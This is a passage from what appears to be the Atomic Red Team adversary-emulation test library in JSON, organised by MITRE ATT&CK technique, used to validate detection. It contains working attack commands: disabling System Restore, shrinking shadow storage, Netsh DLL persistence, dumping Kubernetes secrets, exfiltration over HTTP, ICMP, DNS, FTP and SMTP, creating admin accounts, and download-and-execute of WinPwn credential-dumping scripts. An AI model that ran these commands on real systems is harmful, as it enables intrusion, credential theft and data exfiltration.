\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\n", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - vssadmin Resize Shadowstorage Volume", "auto_generated_guid": "da558b07-69ae-41b9-b9d4-4d98154a7049", "description": "Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.", "supported_platforms": ["windows"], "executor": {"command": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%", "name": "powershell", "elevation_required": true}}]}, "T1546.007": {"name": "Netsh Helper DLL", "technique_id": "attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed", "external_id": "T1546.007", "data_components": ["Module Load", "Process Creation", "Windows Registry Key Modification", "Command Execution"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)", "atomic_tests": [{"name": "Netsh Helper DLL Registration", "auto_generated_guid": "3244697d-5a3a-4dfc-941c-550f69f91a4d", "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n", "supported_platforms": ["windows"], "input_arguments": {"helper_file": {"description": "Path to DLL", "type": "path", "default": "PathToAtomicsFolder\\T1546.007\\bin\\NetshHelper.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Helper DLL must exist on disk at specified location (#{helper_file})\n", "prereq_command": "if (Test-Path \"#{helper_file}\") { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{helper_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.007/bin/NetshHelper.dll\" -OutFile \"#{helper_file}\"\n"}], "executor": {"command": "netsh.exe add helper \"#{helper_file}\"\ntaskkill /im notepad.exe /t /f > NUL 2>&1\n", "cleanup_command": "netsh.exe delete helper \"#{helper_file}\"\n", "name": "command_prompt", "elevation_required": true}}]}, "T1090.001": {"name": "Internal Proxy", "technique_id": "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755", "external_id": "T1090.001", "data_components": ["Network Connection Creation", "Network Traffic Content", "Network Traffic Flow"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c"], "description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.", "atomic_tests": [{"name": "Connection Proxy", "auto_generated_guid": "0ac21132-4485-4212-a681-349e8a6637cd", "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"proxy_server": {"description": "Proxy server URL (host:port)", "type": "url", "default": "127.0.0.1:8080"}, "proxy_scheme": {"description": "Protocol to proxy (http or https)", "type": "string", "default": "http"}}, "executor": {"command": "export #{proxy_scheme}_proxy=#{proxy_server}\n", "cleanup_command": "unset http_proxy\nunset https_proxy\n", "name": "sh"}}, {"name": "Connection Proxy for macOS UI", "auto_generated_guid": "648d68c1-8bcd-4486-9abe-71c6655b6a2c", "description": "Enable traffic redirection on macOS UI (not terminal).\nThe test will modify and enable the \"Web Proxy\" and \"Secure Web Proxy\" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.\n\nNote that this test may conflict with pre-existing system configuration.\n", "supported_platforms": ["macos"], "input_arguments": {"proxy_server": {"description": "Proxy server URL (host)", "type": "url", "default": "127.0.0.1"}, "proxy_port": {"description": "Proxy server port", "type": "integer", "default": 8080}, "interface": {"description": "Protocol to proxy (http or https)", "type": "string", "default": "Wi-Fi"}}, "executor": {"name": "sh", "command": "networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\n", "cleanup_command": "networksetup -setwebproxystate #{interface} off\nnetworksetup -setsecurewebproxystate #{interface} off  \n"}}, {"name": "portproxy reg key", "auto_generated_guid": "b8223ea9-4be2-44a6-b50a-9657a3d4e72a", "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n", "supported_platforms": ["windows"], "input_arguments": {"connectaddress": {"description": "Specifies the IPv4 address to which to connect. Acceptable values are IP address, computer NetBIOS name, or computer DNS name. If an address is not specified, the default is the local computer.", "type": "string", "default": "127.0.0.1"}, "connectport": {"description": "Specifies the IPv4 port, by port number or service name, to which to connect. If connectport is not specified, the default is the value of listenport on the local computer.", "type": "string", "default": "1337"}, "listenport": {"description": "Specifies the IPv4 port, by port number or service name, on which to listen.", "type": "string", "default": "1337"}}, "executor": {"command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}", "cleanup_command": "netsh interface portproxy delete v4tov4 listenport=#{listenport} -ErrorAction Ignore | Out-Null", "name": "powershell", "elevation_required": true}}]}, "T1216": {"name": "System Script Proxy Execution", "technique_id": "attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe", "external_id": "T1216", "data_components": ["Script Execution", "Command Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)", "atomic_tests": [{"name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution", "auto_generated_guid": "275d963d-3f36-476c-8bef-a2a3960ee6eb", "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "A PowerShell command to execute.", "type": "string", "default": "Start-Process calc"}}, "executor": {"command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;#{command_to_execute}\"\n", "name": "command_prompt"}}, {"name": "manage-bde.wsf Signed Script Command Execution", "auto_generated_guid": "2a8f2d3c-3dec-4262-99dd-150cb2a4d63a", "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "A command to execute.", "type": "path", "default": "%windir%\\System32\\calc.exe"}}, "executor": {"command": "set comspec=#{command_to_execute}\ncscript %windir%\\System32\\manage-bde.wsf\n", "cleanup_command": "set comspec=%windir%\\System32\\cmd.exe\n", "name": "command_prompt"}}]}, "T1552.007": {"name": "Container API", "technique_id": "attack-pattern--f8ef3a62-3f44-40a4-abca-761ab235c436", "external_id": "T1552.007", "data_components": ["Command Execution", "User Account Authentication"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ", "atomic_tests": [{"name": "List All Secrets", "auto_generated_guid": "31e794c4-48fd-4a76-aca4-6587c155bc11", "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster.\n[More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/).\n\nThis test will make a request to the Kubernetes api at the `/api/v1/secrets` endpoint requesting every secret stored within the cluster.\n", "supported_platforms": ["containers"], "dependencies": [{"description": "kubectl must be installed\n", "prereq_command": "which kubectl\n", "get_prereq_command": "echo \"kubectl not installed, please install kubectl (https://kubernetes.io/docs/tasks/tools/)\"\n"}], "executor": {"command": "kubectl get secrets --all-namespaces\n", "name": "bash", "elevation_required": false}}, {"name": "ListSecrets", "auto_generated_guid": "43c3a49d-d15c-45e6-b303-f6e177e44a9a", "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services.\n", "supported_platforms": ["containers"], "input_arguments": {"namespace": {"description": "K8s namespace to list", "type": "string", "default": "default"}}, "dependencies": [{"description": "kubectl must be installed\n", "get_prereq_command": "echo \"kubectl must be installed manually\"\n", "prereq_command": "which kubectl\n"}], "executor": {"command": "kubectl get secrets -n #{namespace}\n", "name": "bash", "elevation_required": false}}, {"name": "Cat the contents of a Kubernetes service account token file", "auto_generated_guid": "788e0019-a483-45da-bcfe-96353d46820f", "description": "Access the Kubernetes service account access token stored within a container in a cluster.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Verify docker is installed.", "prereq_command": "which docker\n", "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"}, {"description": "Verify docker service is running.", "prereq_command": "sudo systemctl status docker\n", "get_prereq_command": "sudo systemctl start docker\n"}, {"description": "Verify kind is in the path.", "prereq_command": "which kind\n", "get_prereq_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n"}, {"description": "Verify kind-atomic-cluster is created", "prereq_command": "sudo kind get clusters\n", "get_prereq_command": "sudo kind create cluster --name atomic-cluster\n"}, {"description": "Verify kubectl is in path", "prereq_command": "which kubectl\n", "get_prereq_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n"}, {"description": "Verify atomic-pod is running.", "prereq_command": "kubectl --context kind-atomic-cluster get pods |grep atomic-pod\n", "get_prereq_command": "kubectl --context kind-atomic-cluster run atomic-pod --image=alpine --command -- sleep infinity\n"}], "executor": {"command": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token\n", "name": "sh", "cleanup_command": "kubectl --context kind-atomic-cluster delete pod atomic-pod\n"}}]}, "T1048.003": {"name": "Exfiltration Over Unencrypted Non-C2 Protocol", "technique_id": "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b", "external_id": "T1048.003", "data_components": ["Network Traffic Content", "Network Traffic Flow", "File Access", "Command Execution", "Network Connection Creation"], "kill_chain_phases": ["exfiltration"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--65401701-019d-44ff-b223-08d520bb0e7b", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c"], "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ", "atomic_tests": [{"name": "Exfiltration Over Alternative Protocol - HTTP", "auto_generated_guid": "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff", "description": "A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n", "supported_platforms": ["macos", "linux"], "executor": {"steps": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n", "name": "manual"}}, {"name": "Exfiltration Over Alternative Protocol - ICMP", "auto_generated_guid": "dd4b4421-2e25-4593-90ae-7021947ad12e", "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Path to file to be exfiltrated.", "type": "path", "default": "C:\\Windows\\System32\\notepad.exe"}, "ip_address": {"description": "Destination IP address where the data should be sent.", "type": "string", "default": "127.0.0.1"}}, "executor": {"command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n", "name": "powershell"}}, {"name": "Exfiltration Over Alternative Protocol - DNS", "auto_generated_guid": "c403b5a4-b5fc-49f2-b181-d1c80d27db45", "description": "Exfiltration of specified file over DNS protocol.\n", "supported_platforms": ["linux"], "executor": {"steps": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n", "name": "manual"}}, {"name": "Exfiltration Over Alternative Protocol - HTTP", "auto_generated_guid": "6aa58451-1121-4490-a8e9-1dada3f1c68c", "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n", "name": "powershell"}, "input_arguments": {"input_file": {"description": "Path to file to exfiltrate", "type": "path", "default": "C:\\Windows\\System32\\notepad.exe"}, "ip_address": {"description": "Destination IP address where the data should be sent", "type": "string", "default": "http://127.0.0.1"}}}, {"name": "Exfiltration Over Alternative Protocol - SMTP", "auto_generated_guid": "ec3a835e-adca-4c7c-88d2-853b69c11bb9", "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}\n", "name": "powershell"}, "input_arguments": {"input_file": {"description": "Path to file to exfiltrate", "type": "path", "default": "C:\\Windows\\System32\\notepad.exe"}, "sender": {"description": "The email address of the sender", "type": "string", "default": "test@corp.com"}, "receiver": {"description": "The email address of the receiver", "type": "string", "default": "test@corp.com"}, "smtp_server": {"description": "SMTP server to use for email transportation", "type": "string", "default": "127.0.0.1"}}}, {"name": "MAZE FTP Upload", "auto_generated_guid": "57799bc2-ad1e-4130-a793-fb0c385130ba", "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n", "supported_platforms": ["windows"], "input_arguments": {"ftp_server": {"description": "FTP Server address", "type": "string", "default": "127.0.0.1"}, "username": {"description": "Username for FTP server login", "type": "string", "default": null}, "password": {"description": "Password for FTP server login", "type": "string", "default": null}}, "executor": {"command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n", "cleanup_command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n", "name": "powershell"}}, {"name": "Exfiltration Over Alternative Protocol - FTP - Rclone", "auto_generated_guid": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b", "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)", "supported_platforms": ["windows"], "input_arguments": {"ftp_server": {"description": "Your own ftp server", "type": "string", "default": "ftp.dlptest.com"}, "ftp_pass": {"description": "Your FTP user's password", "type": "string", "default": "rNrKYTX9g7z3RgJRmxWuGHbeu"}, "ftp_user": {"description": "Your FTP username", "type": "string", "default": "dlpuser"}, "ftp_port": {"description": "Your FTP's port", "type": "integer", "default": 21}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Check if the exfil package exists\n", "prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n", "get_prereq_command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n"}, {"description": "Check if rclone zip exists", "prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n"}], "executor": {"command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate", "name": "powershell", "elevation_required": true}}, {"name": "Python3 http.server", "auto_generated_guid": "3ea1f938-f80a-4305-9aa8-431bc4867313", "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\n"}}, {"name": "Python3 http.server (freebsd)", "auto_generated_guid": "57a303a2-0bc6-400d-b144-4f3292920a0b", "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3.9 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "if [ $(which python3.9) ]; then cd /tmp; python3.9 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\n"}}]}, "T1078.003": {"name": "Local Accounts", "technique_id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2", "external_id": "T1078.003", "data_components": ["Logon Session Metadata", "User Account Authentication", "Logon Session Creation"], "kill_chain_phases": ["defense-evasion", "persistence", "privilege-escalation", "initial-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ", "atomic_tests": [{"name": "Create local account with admin privileges", "auto_generated_guid": "a524ce99-86de-4db6-b4f9-e08f35a47a15", "description": "After execution the new account will be active and added to the Administrators group", "supported_platforms": ["windows"], "input_arguments": {"password": {"description": "Password for art-test user", "type": "string", "default": "-4RTisCool!-321"}}, "executor": {"command": "net user art-test /add\nnet user art-test #{password}\nnet localgroup administrators art-test /add", "cleanup_command": "net localgroup administrators art-test /delete >nul 2>&1\nnet user art-test /delete >nul 2>&1", "name": "command_prompt", "elevation_required": true}}, {"name": "Create local account with admin privileges - MacOS", "auto_generated_guid": "f1275566-1c26-4b66-83e3-7f9f7f964daa", "description": "After execution the new account will be active and added to the Administrators group", "supported_platforms": ["macos"], "executor": {"command": "dscl . -create /Users/AtomicUser\ndscl . -create /Users/AtomicUser UserShell /bin/bash\ndscl . -create /Users/AtomicUser RealName \"Atomic User\"\ndscl . -create /Users/AtomicUser UniqueID 503\ndscl . -create /Users/AtomicUser PrimaryGroupID 503\ndscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser\ndscl . -passwd /Users/AtomicUser mySecretPassword\ndscl . -append /Groups/admin GroupMembership AtomicUser", "cleanup_command": "sudo dscl . -delete /Users/AtomicUser", "name": "bash", "elevation_required": true}}, {"name": "Create local account with admin privileges using sysadminctl utility - MacOS", "auto_generated_guid": "191db57d-091a-47d5-99f3-97fde53de505", "description": "After execution the new account will be active and added to the Administrators group", "supported_platforms": ["macos"], "executor": {"command": "sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin", "cleanup_command": "sysadminctl interactive -deleteUser art-tester", "name": "bash", "elevation_required": true}}, {"name": "Enable root account using dsenableroot utility - MacOS", "auto_generated_guid": "20b40ea9-0e17-4155-b8e6-244911a678ac", "description": "After execution the current/new user will have root access", "supported_platforms": ["macos"], "executor": {"command": "dsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user", "cleanup_command": "dsenableroot -d #current user\ndsenableroot -d -u art-tester -p art-tester #new user", "name": "bash", "elevation_required": true}}, {"name": "Add a new/existing user to the admin group using dseditgroup utility - macOS", "auto_generated_guid": "433842ba-e796-4fd5-a14f-95d3a1970875", "description": "After execution the current/new user will be added to the Admin group", "supported_platforms": ["macos"], "executor": {"command": "dseditgroup -o edit -a art-user -t user admin", "cleanup_command": "dseditgroup -o edit -d art-user -t user admin", "name": "bash", "elevation_required": true}}, {"name": "WinPwn - Loot local Credentials - powerhell kittie", "auto_generated_guid": "9e9fd066-453d-442f-88c1-ad7911d32912", "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive", "name": "powershell", "elevation_required": true}}, {"name": "WinPwn - Loot local Credentials - Safetykatz", "auto_generated_guid": "e9fdb899-a980-4ba4-934b-486ad22e22f4", "description": "Loot local Credentials - Safetykatz technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive", "name": "powershell", "elevation_required": true}}, {"name": "Create local account (Linux)", "auto_generated_guid": "02a91c34-8a5b-4bed-87af-501103eb5357", "description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nsu art\nwhoami\nexit\n", "cleanup_command": "userdel -r art \n"}}, {"name": "Create local account (FreeBSD)", "auto_generated_guid": "95158cc9-8f6d-4889-9531-9be3f7f095e0", "description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": true, "command": "pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0      \nsu art\nwhoami\nexit\n", "cleanup_command": "rmuser -y art\n"}}, {"name": "Reactivate a locked/expired account (Linux)", "auto_generated_guid": "d2b95631-62d7-45a3-aaef-0972cea97931", "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nusermod --lock art\nusermod --expiredate \"1\" art\nusermod --unlock art\nusermod --expiredate \"99999\" art\nsu art\nwhoami\nexit\n", "cleanup_command": "userdel -r art \n"}}, {"name": "Reactivate a locked/expired account (FreeBSD)", "auto_generated_guid": "09e3380a-fae5-4255-8b19-9950be0252cf", "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and 